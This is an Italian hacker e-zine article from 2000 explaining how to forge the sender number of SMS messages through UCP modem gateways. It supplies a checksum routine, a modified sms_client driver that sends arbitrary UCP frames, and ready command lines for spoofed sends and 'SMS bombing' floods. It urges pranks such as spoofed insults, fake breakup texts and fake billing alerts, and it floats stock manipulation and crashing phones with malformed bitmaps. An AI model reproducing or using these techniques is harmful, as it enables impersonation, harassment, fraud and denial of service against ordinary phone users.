==============================================================================
-------------[ BFi numero 9, anno 3 - 03/11/2000 - file 15 di 21 ]------------
==============================================================================


-[ PHREACKING ]---------------------------------------------------------------
---[ SMS SP00FiNG E 0LTRE
-----[ Jack McKrak


Come tutti sanno, gli SMS sono quei simpatici agglomerati di 160 caratteri che
vagano per la rete GSM. Allegri, teneri, cattivi, pesanti o rompikazzo, questa
massa di bit entra sempre piu' spesso nella nostra vita. La gente normale si
fida degli sms.
Se arriva un messaggio da "MARCO CELL" allora significa che sicuramente l'ha 
inviato il cellulare di Marco. Ma ne siamo cosi' sicuri? Esiste il modo di
contraffare il numero del mittente di un SMS? La risposta (che potete gia' 
intuire dal titolo) la troverete nelle prossime righe.

Ma prima parliamo un po' delle conseguenze. 
Cosa si puo' fare con un SMS spoofato ovvero con un sms con il numero del 
mittente scelto da noi?
Il fatto che normalmente sia impossibile modificare il numero sorgente di un 
messaggio trasforma tutto quello che arriva attraverso un sms in oro colato. 
Situazione: due conoscenti, preferibilmente facili all'inkazzatura, e due 
cellulari. A ciascuno dei due mandate un messaggio con il numero dell'altro 
come mittente e con scritte sopra le peggiori offese che vi vengono in mente. 
Risultato: i due si scanneranno telefonicamente per circa un'ora e poi dovrete
intervenire per spiegare lo scherzo, perche' rischierete che si degeneri nella
rissa, visto che tutti e due penseranno che sia l'altro a fare il coglione.
Ma questo e' uno scherzetto banale. Una cosa un po' piu' cattiva e' prendere
come vittima una bella coppietta... quelle che sono solite mandarsi tanti sms
teneri e sdolcinati... e spedire a uno dei due con il num dell'altro una bella
frase presa dal peggiore film porno amatoriale. Oppure se un vostro amico ha 
Omnitel, mandare un messaggio dal numero 2010 con scritto
"Addebito SMS L 124000", sul momento vi assicuro gli viene un colpo al cuore.

Sono cose divertenti, ma pensandoci mi inquieta quanto ci puo' condizionare la
tecnologia e quanto spesso riteniamo indiscutibile un'informazione solo
perche' ce la trasmette un qualche apparato di cui non conosciamo nemmeno il
funzionamento. Inconsciamente abbiamo un senso di fiducia, convinti che
l'ipocrisia sia una caratteristica solo delle parole che escono da una bocca
umana. Non considero poi casi ben peggiori, cose che sinceramente non auguro
neanche al mio peggior nemico. Tipo mandare un messaggio a una coppia gia' in
crisi con una frase "Non ti voglio piu'... ti chiamo dopo, ma sento che e' 
finita" penso che se capitasse a me e fossi ignaro della possibilita' di
forgiare sms fasulli, cadrei in uno sconforto piu' totale, quelle sensazioni
che ti gelano il sangue... e perche'?
Perche' ti sei fidato di uno strumento che qualcuno ha manovrato, magari una
persona che ti odia perche' gli hai tirato giu' la botnet sul canale
#pippaioli... harggg...

E pensiamo poi a qualcosa di piu' criminale, forse solo piu' improbabile, ma
non impossibile. Alcuni ricevono gli aggiornamenti dell'andamento dei titoli
in borsa via sms. Io comincio a mandare sms fasulli con il titolo "skrokkoni
srl" che sale del 10%.
Magari questa persona fa' un investimento di milioni, ci perde e invece io ci 
guadagno.
E poi il giorno dopo questa cosa viene fuori sui giornali e tutti si
stupiscono... e poi si stanziano 4 miliardi di dollari per il terrorismo 
informatico... e poi arrivano i comunicati stampa... e poi andate tutti a 
cagare! Perche' queste cose si sanno da sempre, solo che l'ingegnere 
occhialuto che fa notare il particolare al capo, ovvero che il servizio
taldeitali puo' essere FACILMENTE abusato da qualche malintenzionato, si sente
ripetere "si', ma dai, adesso ci mettiamo a spendere degli altri soldi... ma 
chi vuoi che ci pensi?". Pronunciate queste parole, quasi per magia, un 15enne 
del Nebraska, a migliaia di kilometri di distanza, viene mollato dalla ragazza
e decide di dichiarare il suo disprezzo per il mondo facendo casini in giro...
trova proprio quel dettaglio e trasforma quella piccola imperfezione nella 
causa del collasso di tutto il sistema. E c'e' solo da ringraziare che sia un 
15enne e non un vero malintenzionato!

OK, forse l'ho fatta troppo tragica, ma sono stufo di vedere giornali e
televisioni che strippano davanti a casini combinati per problemi conosciuti
da tempo, ma taciuti o per superficialita' o semplicemente per nasconderli.

Adesso che mi sono sfogato passiamo alla parte tecnica. Spesso gli operatori
di telefonia mobile offrono il servizio di invio sms tramite appositi
SMS-Gateway raggiungibili via modem. Sono la stessa cosa dei vari servizi
presenti su internet, solo che in questo caso non devi compilare una form web,
ma ti colleghi via telefono e ottieni il servizio attraverso un protocollo di
comunicazione. E' un'attimo un piu' laborioso, c'e' da fare una telefonata e
utilizzare un programma adatto, pero' questo sistema ha diversi vantaggi che
cerchero' di spiegare.

Cerchiamo prima di tutto di dare un'occhiata al protocollo usato in queste
occasioni.
Da quello che ho potuto vedere se ne usano principalmente due: il TAP e l'UCP.
Io mi sono guardato solo l'UCP perche' e' piu' rapido e intuitivo. In sintesi
nel protocollo UCP (Universal Computer Protocol... che nome del cazzo) si
invia una trama formattata in questo modo:

<STX> HDR DATA CRC <ETX>

dove <STX> e <ETX> sono i caratteri di start-stop rispettivamente 02h e 03h.

L'header (HDR) contiene alcuni sottocampi separati dal carattere '/'

TRN/LNG/OR/OPN

TRN [2 NUMERIC CHAR] e' il numero della transizione (casuale) e varia 
		     fra 0 e 99
LNG [5 NUMERIC CHAR] la lunghezza della trama ovvero quanti caratteri ci sono
                     fra <ETX> e <STX>
OR  [1 CHAR]         puo' essere il carattere 'O' che indica la richiesta di
		     servizio o il carattere 'R' che indica risposta a una
                     richiesta
OT  [2 NUMERIC CHAR] e' il codice dell'operazione richiesta ed e' il parametro
                     piu' interessante.

La lista dei servizi e' elencata (come del resto tutti gli altri parametri
tecnici) nel doc di definizione del protocollo UCP che e' compreso nel
documento "ETS 133-3" prodotto dall'ETSI, ovvero l'ente che in europa si
occupa di gran parte degli standard in materia di telecomunicazioni.

I servizi piu' interessanti alla fine pero' sono due: lo 01 e lo 02.

01 Invio di un singolo SMS
02 Invio di un SMS multiplo

Esempio di header 01/00020/O/01

Il campo DATA varia da servizio a servizio. Per lo 01 e' composto da questi
sottocampi:

AdC/OAdC/OAC/MT/AMsg

AdC  [STRING OF NUM CHAR] E' il numero del destinatario del messaggio
                          visto che di solito i gateway sono fuori dall'italia
                          il numero e' meglio scriverlo ad esempio come: 
			  0039347000000 dove 0039 e' sempre presente
OAdC [STRING OF NUM CHAR] E qui casca l'asino! Questo e' il numero sorgente
			  del messaggio! Qui potete metterci qualsiasi serie
			  di caratteri fra 0 e 9. Anche tipo 666 o 123456 o 
		          0000000.
                          Se pero' notate i messaggi autentici indicano il 
			  numero del mittente come +39ecc. Purtroppo il '+' 
			  non si riesce a mettere e i vostri messaggi al 
			  massimo possono arrivare da un 0039ecc.
OAC  [STRING OF CHAR]     Codice di autentificazione del mittente. Non so a
			  che cazzo serva. Va lasciato in bianco.
MT   [1 NUM CHAR]         Tipo di messaggio. Qui va messo sempre 3 che indica 
			  un messaggio alfanumerico.
AMsg [STRING OF CHAR]     Il messaggio vero e proprio.

Per l'AMsg va fatta una piccola digressione. Il testo non e' scritto in
chiaro, ma va codificato in stringhe IA5. Sembra una cosa cazzuta, invece
semplicemente si tratta di scrivere i caratteri con la loro codifica ascii
invece che in chiaro. Questo perche' quei pippaioli degli ingegneri che hanno
redatto il protocollo volevano inserire un controllo di errore in piu' visto
che per inviare un carattere cosi' bisogna mandarne due.

Cosa forse inutile, visto che l'ultimo campo CRC e' un controllo di errore.
Questo paramentro sono due caratteri che costituiscono un numero in
esadecimale. Il numero si ottiene prendendo le ultime due cifre significative
(esadecimali) o della somma di tutti i caratteri che compongono header e data.

Ecco la procedura che fa questa somma

void UCP_generate_checksum(char *buf, char *crc)
{
	char	*ptr;
	int	j;


	j = 0;
	for (ptr = buf; *ptr != '\0'; ptr++)
	{
		j += *ptr;

		if (j >= 256)
		{	j -= 256;
		}
	}

	sprintf(crc,"%02X", j);

}

Dunque se noi volessimo mandare un sms al numero 0039347123456 da numero 666
con testo "Satana ti vede" ecco cosa dovremmo comunicare al nostro gateway di
fiducia.

<STX>01/00066/O/01/0039347123456/666//3/536174616E612074692076656465/F6<ETX>
-----|   HEADER   |       DATA         (S a t a n a   t i   v e d e)|CRC|---

Se la nostra query e' stata accettata il gateway rispondera piu' o meno cosi'

<STX>01/00045/R/01/A/0039347123456:090800114008/A0<ETX>

la vostra richiesta e' in questo momento nello stack del server che dopo poco
la inoltrera' alla rete GSM che la smistera' fino alla stazione base a cui
e' collegato il cellulare del destinatario dove verra' sparato via etere.
Tutto questo nel giro di 10 secondi se non ci sono intasamenti nel gateway o
nella rete GSM.

Ma come vi ho accennato c'e' anche un servizio 02 che e' molto interessante.
Dipende da gateway a gateway, solo alcuni ve lo lasceranno usare visto che e'
un'opzione che impiega parecchie risorse. Se e' attivo avete infatti la
possibilita' di inviare fino a 20 sms in un'unica botta, ovvero il famoso sms
multiplo.
Inviare lo stesso messaggio a 20 persone diverse puo' essere utile? Non lo so,
ma si possono fare tante cose divertenti. Esempio. Prendete una lista di 20
numeri di cell fra amici e conoscenti possibilemente singles. Prendete un
vostro amico a cui volete fare un scherzo. Mandate un sms multiplo ai 20
numeri con numero sorgente il cell della vittima e con scritto: "Un nostro
amico comune mi ha dato il tuo numero. Mi piaci molto e vorrei conoscerti. Ti
dice qualcosa il 3 luglio ?" Nonostante il 3 luglio non sia successo un cazzo
io sarei comunque curioso di sapere chi e' questo soggetto/soggetta e
chiamerei il numero. Ma chi chiamo in realta'? Il numero della vittima ignara
di tutto che si subisce 20 telefonate nel giro di pochi minuti! Dunque cosa ho
ottenuto... un sms smurf!! :)) Veramente troppo divertente.

Se invece vogliamo fare piu' una cosa da DoS puro invece di mandare al gateway
una lista di 20 numeri diversi, mandiamo un sms multiplo con 20 numeri tutti
uguali. Cosa succede?
Il gateway non si accorge che i numeri sono tutti uguali e piazza nello stack 
tutti i messaggi insieme senza attese. In circa 1 minuto il cellulare della
vittima verra' bombardato da 20 sms filati, opure 40 se facciamo 2 chiamate e
cosi' via... in sintesi vi assicuro che mandate in sklero il povero individuo
che ricevera' questo sms bombing.
Da usare con cura anche perche' magari si inkazza sul serio... e poi magari il
gestore del server sms si rompe il cazzo e dopo nessuno fa piu' niente...

Il campo DATA del servizio 02 e' il seguente:

NPL/RAd:s/OAdC/OAC/MT/AMsg

NPL  [STRING OF NUM CHAR] indica quanti sono gli sms da inviare e corrisponde
			  ai numeri di telefono che seguiranno dopo, ovvero
			  se e' 3 dopo dovremmo inserire 3 numeri di
			  destinatari
RAd:s[STRING OF NUM CHAR] lista dei numeri dei destinatari. Vanno semparati 
			  sempre con il carattere '/'. Esempio
			  '0039347123456/0039347543210/0039347234765'
OAdC [STRING OF NUM CHAR] come sopra
OAC  [STRING OF CHAR]     come sopra
MT   [1 NUM CHAR]         come sopra
AMsg [STRING OF CHAR]     come sopra

Ora, ma io come ci parlo con il server? Be' ci sono mille modi, potete
usare qualche programmino scritto da voi, emulatori di terminale, qualsiasi 
cosa spari dei caratteri su una connessione aperta con un modem. Io con ISDN 
ho usato la possibilita' di sfruttare l'emulazione AT e ho trovato un
programmino davvero ben fatto che si chiama sms_client 
(http://www.styx.demon.co.uk) adatto al nostro scopo.
Ok, non proprio adatto, con quello potete mandare sms attraverso gateway, ma
non usare tutte le possibilita' offerte dall'UCP e viste poco sopra.
Per lasciare piu' liberta' di azione ho modificato leggermete questo
programma.

Vi spiego la mia modifica e come mandare messaggi.

Prima cosa. Scaricatevi il programma, il file si chiama 
smsclient_2.0.8r.tar.gz 
(http://www.styx.demon.co.uk/archive/sms_client-2.0.8r.tar.gz). 
Scompattate. Fate il classico make, make install e se non avete fatto casini 
vi troverete sotto /etc la dir 'sms' che contiene tutti i settaggi del 
programma. Dentro questa dir va editato il file sms_modem che contiene i
settaggi del vostro modem. C'e' anche una sottodir 'services', dentro questa
ci sono i file che corrispondono ai gateway sms sparsi per il mondo.
Ovviamente ce ne sono solo alcuni e per giunta quelli piu' conosciuti.
Questo implica che sono quelli piu' usati e che solitamente lasciano meno
possibilita' di smanettare e di divertirsi. Sta a voi recuperare altri numeri
di qualche gateway piu' disponibile.
Spesso per fare andare il prog cambiate il '+' nel numero del gateway
impostato in questi file con '00' da chiamata internazionale (okkio a non
stare collegati troppo, nell 99% dei casi chiamate qualche paese estero).

A questo punto vi allego il mio codice. La mia modifica e' imbecille, uno 
scimmione del kongo farebbe di meglio, dunque forse se avete un po' di voglia
lavorateci da soli per ottenete qualcosa di piu' pratico...

Quello che segue va salvato come file ucp.c

<-| ucp.c |->
/* -------------------------------------------------------------------- */
/* Variante del file ucp.c per sms_client 2.0.8r by JacK McKrak         */
/* -------------------------------------------------------------------- */

#include <stdio.h>
#include <string.h>
#include <stdarg.h>

#include "common/common.h"
#include "logfile/logfile.h"
#include "driver.h"
#include "error.h"
#include "ascii.h"
#include "comms/comms.h"
#include "resource/resource.h"

/* -------------------------------------------------------------------- */

static struct ucp_env
{
	DRIVER_DEFAULT_ENV def;

	/* Place any extended driver	*/
	/* variables here 		*/

} driver_env;

/* -------------------------------------------------------------------- */

static 	RESOURCE resource_list[] =
	{
		{ RESOURCE_STRING,  "SMS_comms_params",
 	0, 1, NULL, 0,  "8N1",      0, 	  &(driver_env.def.comms_params)
  		},
		{ RESOURCE_STRING,  "SMS_centre_number", 	
	0, 1, NULL, 0,  NULL,       0, 	  &(driver_env.def.centre_number)
	  	},
		{ RESOURCE_NUMERIC, "SMS_baud", 		
	0, 1, NULL, 0,  NULL,       9600, &(driver_env.def.baud)
  		},
		{ RESOURCE_NUMERIC, "SMS_deliver_timeout", 	
	0, 0, NULL, 0,  NULL,       30,   &(driver_env.def.deliver_timeout)
	  	},
		{ RESOURCE_NUMERIC, "SMS_timeout",
 	0, 0, NULL, 0,  NULL,       10,   &(driver_env.def.timeout)
  		},
		{ RESOURCE_NUMERIC, "SMS_write_timeout",
 	0, 0, NULL, 0,  NULL,       10,   &(driver_env.def.write_timeout)
	  	},
		{ RESOURCE_NUMERIC, "SMS_max_deliver",
 		0, 0, NULL, 0,  NULL,       1,    &(driver_env.def.max_deliver)
	  	},
		{ RESOURCE_NULL,     NULL, 
		0, 1, NULL, 0,  NULL,       0,    NULL
  		}
	};

/* -------------------------------------------------------------------- */

#define DELIVERTIMEOUT 		(driver_env.def.deliver_timeout)
#define TIMEOUT 		(driver_env.def.timeout)
#define WRITETIMEOUT 		(driver_env.def.write_timeout)

/* -------------------------------------------------------------------- */

#define FD			(driver_env.def.fd)

/* -------------------------------------------------------------------- */

static int UCP_sendmessage(char *msisdn, char *message);
static int UCP_parse_response(char *string);
static void UCP_hangup(void);
static char *UCP_generate_checksum(const char *fmt, ...);
static char *UCP_build_message(char *msisdn, char *message);
static char *UCP_build_transaction(int transaction_id, char transaction_type,
                                   int operation_type, const char *fmt, ...);

/* -------------------------------------------------------------------- */
/* -------------------------------------------------------------------- */
static char *UCP_generate_checksum(const char *fmt, ...)
{
	va_list args;
static 	char	buf[1024];
	char	*ptr;
	int	j;



	va_start(args, fmt);
#if !defined(LINUX)
	vsprintf(buf, fmt, args);
#else
	vsnprintf(buf, 1024, fmt, args);
#endif
	va_end(args);


	/* ------------------------ */

	j = 0;
	for (ptr = buf; *ptr != '\0'; ptr++)
	{
		j += *ptr;

		if (j >= 256)
		{	j -= 256;
		}
	}

	sms_snprintf(buf, 1024, "%02X", j);
	return buf;
}


/* -------------------------------------------------------------------- */
/* -------------------------------------------------------------------- */
static char *UCP_build_transaction(int transaction_id, char transaction_type,
                                   int operation_type, const char *fmt, ...)
{
	va_list args;
static	char	buf[1024];
	char	header[1024],
		data[1024],
		codestring[1024];

	FILE *fcd;


	va_start(args, fmt);
#if !defined(LINUX)
	vsprintf(data, fmt, args);
#else
	vsnprintf(data, 1024, fmt, args);
#endif
	va_end(args);

	/* ------------------------ */


	fcd = fopen("codice","r");
	fscanf(fcd,"%s",&codestring);
	fclose(fcd);

	sms_snprintf(header, 1024, "%02d/%05d/%c", transaction_id,
	   sms_strlen(data) + sms_strlen(codestring) + 15, transaction_type);

	printf("<STX>%s/%s/%s/%s<ETX>\n",header,codestring,
	     data,UCP_generate_checksum("%s/%s/%s/",header,codestring,data));

	sms_snprintf(buf, 1024, "%c%s/%s/%s/%s%c", S_STX,
	                             header,
	                             codestring,
	                             data,
	                             UCP_generate_checksum("%s/%s/%s/", 
					header, codestring, data),
	                             S_ETX);

	return buf;
}


/* -------------------------------------------------------------------- */
/* -------------------------------------------------------------------- */
static char *UCP_build_message(char *msisdn, char *message)
{
	char	ia5_message[1024],
		*src,
		*dest;


	dest = ia5_message;
	for (src = message; *src != '\0'; src++)
	{
		sms_snprintf(dest, 1024, "%02X", *src);
		dest += 2;
	}

	return UCP_build_transaction(1, 'O', 1, "%s", ia5_message);
}


/* -------------------------------------------------------------------- */
/* Return Values:							*/
/*	 0 Positive ACK 						*/
/*	 1 Negative ACK							*/
/*	-1 Error  							*/
/* -------------------------------------------------------------------- */
static int UCP_parse_response(char *string)
{
	int	result;

	int  	transaction,
 		length,
		type,
		checksum;

	char 	ack,
		recipient[64],
		timestamp[64];

	/* ------------------------------------------------------------ */
	/* Example:							*/
	/* <STX>01/00045/R/01/A/0041544180972:161298112313/A6<ETX> 	*/
	/* <STX>01/00019/R/01/A//69<ETX>				*/
	/* ------------------------------------------------------------ */

	result = sscanf(string, "\002%02d/%05d/R/%02d/%c/%16[^:]:%12s/%02X\003",
	                &transaction,
	                &length,
	                &type,
	                &ack,
	                recipient,
	                timestamp,
	                &checksum);

	if (result != 7)
	{
		result = sscanf(string, "\002%02d/%05d/R/%02d/%c//%02X\003",
		                &transaction,
		                &length,
		                &type,
		                &ack,
		                &checksum);

		if (result != 5)
		{	return -1;
		}
	}

	/* ---------------------------- */

	result = -1;

	if (ack == 'A')
	{	result = 0;
	}
	else
	if (ack == 'N')
	{	result = 1;
	}

	return result;
}

/* -------------------------------------------------------------------- */
/* -------------------------------------------------------------------- */
static int UCP_sendmessage(char *msisdn, char *message)
{
	char 	buf[MAX_RESPONSE_BUFSIZE],
		*ucp_message;

	int	result;


	ucp_message = UCP_build_message(msisdn, message);
	twrite(FD, ucp_message, sms_strlen(ucp_message), WRITETIMEOUT);

	if (expstr(FD, buf, "\03", MAX_RESPONSE_BUFSIZE, DELIVERTIMEOUT) == 0)
	{
		lprintf(LOG_STANDARD, "SMSC Respsonse: %s\n", buf);

		result = UCP_parse_response(buf);
		if (result == 0)
		{
			lprintf(LOG_STANDARD, "Received Acknowledgement\n");
		}
		else
		if (result == 1)
		{	lprintf(LOG_STANDARD, "Acknowledgement Failed\n");

			UCP_hangup();
			return EUCP_ACKFAILED;
		}
		else
		{	lprintf(LOG_STANDARD, "Bad Acknowledgement\n");

			UCP_hangup();
			return EUCP_BADACK;
		}
	}
	else
	{	lprintf(LOG_STANDARD, "No Message Response\n");

		UCP_hangup();
		return EUCP_NORESPONSE;
	}

	return 0;
}

/* -------------------------------------------------------------------- */
/* -------------------------------------------------------------------- */
static void UCP_hangup(void)
{	default_hangup((DRIVER_DEFAULT_ENV *)(&driver_env));
}

/* -------------------------------------------------------------------- */
/* -------------------------------------------------------------------- */
DEVICE_ENTRY ucp_device = {

	"UCP",
	"1.0",
	resource_list,
	(DRIVER_DEFAULT_ENV *)(&driver_env),

	default_init,
	default_main,
	default_validate_numeric_id,
	default_dial,
	default_hangup,
	default_send_disconnect,
	default_single_deliver,
	UCP_sendmessage,
	default_login
};
<-X->


Creato il file ucp.c sostituitelo nella sottodirectory /src/driver del 
programma sms_client, deve esisterne gia' uno con questo nome. Ricompilate. 
Andate nella sottodir /bin dove devono esserci i nuovi file eseguibili,
soprattutto il file sms_client.

Ora siamo pronti per mandare un messaggio, manca solo da editare il file
'codice' Questo file e' usato dalla mia modifica di ucp.c per poter mandare
comandi qualunque al gateway, senza passare dalle ridotte opzioni di
sms_client.

Create il file 'codice'.

In questo file va messa una parte del campo HEADER e del campo DATA dell'sms 
che volete inviare. Dell'header solo il campo OT, del data tutto tranne AMasg.

Ovvero, rifacendosi al messaggio 'Satana ti vede', dentro il file 'codice' va
messa questa riga di testo:

01/0039347123456/666//3

Salva il file. Ora spostalo nella dir dove e' presente l'eseguibile sms_client
e batti

./sms_client d2:0 'Satana ti vede'

In questo caso Il nostro pc telefonera' al gateway di d2 (file definito nella
dir /etc/sms/services) e cerchera' di mandare il messaggio secondo quello che
e' scritto nel file 'codice'. Il programma vi fara' vedere cosa combina passo
per passo e se tutto e' andato a buon fine qualche vostro amico potrebbe 
riconsiderare "L'Esorcista".

Per mandare un sms multiplo il nostro file codice dovra' contenere ad esempio
la riga

02/3/0039347123456/0039347543210/0039347234765/666//3

e partiranno 3 sms con un'unica chiamata.

Un sms bombing sara' invece cosi'

02/20/0039347123456/0039347123456/0039347123456/0039347123456/0039347123456/
... eccetera

Ma non abusatene! Pensate a quel poveretto!

OK, credo di aver detto tutto... ci sono altre mille cose che si possono fare
con queste poche e scarne informazioni, dipende poi dalla vostra fantasia.

Un ultima cosa...
			cercate di non fare casini!

Se avete qualche dubbio o news scrivete alla mail di BFi, se trovo un 
po' di tempo saro' felice di rispondervi...

Se fate qualche bello scherzo mandatemi il log che mi diverto troppo con
queste storie...

Azz, dimenticavo. Se qualcuno vuole cimentarsi in qualcosa di piu' cazzuto si
studi come vengono codificati gli SMS che trasportano ad esempio loghi per
NOKIA (guardatevi su qualche doc gli "OTA BITMAP"). Mi gioco le palle che se
si formatta male il campo header di questi messaggi (tipo facendo credere che
arrivi un bitmap di dimensioni spropositate o nulle) si manda quasi
sicuramente in crash il cellulare di chi lo riceve... poi vi faro' sapere!

Alla prossima...

					JacK McKrak


==============================================================================
---------------------------------[ EOF 15/21 ]--------------------------------
==============================================================================
